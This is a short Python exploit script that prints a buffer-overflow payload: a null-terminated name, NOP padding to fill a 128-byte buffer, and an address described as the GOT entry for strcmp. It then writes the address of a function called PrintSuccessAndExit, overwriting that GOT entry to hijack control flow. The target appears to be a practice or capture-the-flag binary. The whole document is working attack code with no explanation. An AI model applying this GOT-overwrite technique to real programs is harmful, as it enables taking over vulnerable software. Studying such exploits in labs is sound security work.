import sys

nameBufferSize = 128

name = b'Yeeva\x00' # name
padding = b'\x90'*(nameBufferSize - len(name)) # fill out the name buffer
address = b'\x18\x40\x40' # GOT entry for strcmp in little endian

sys.stdout.buffer.write(name + padding + address + b'\n')

sys.stdout.buffer.write(b'\x62\x12\x40')  # PrintSuccessAndExit address in little endian
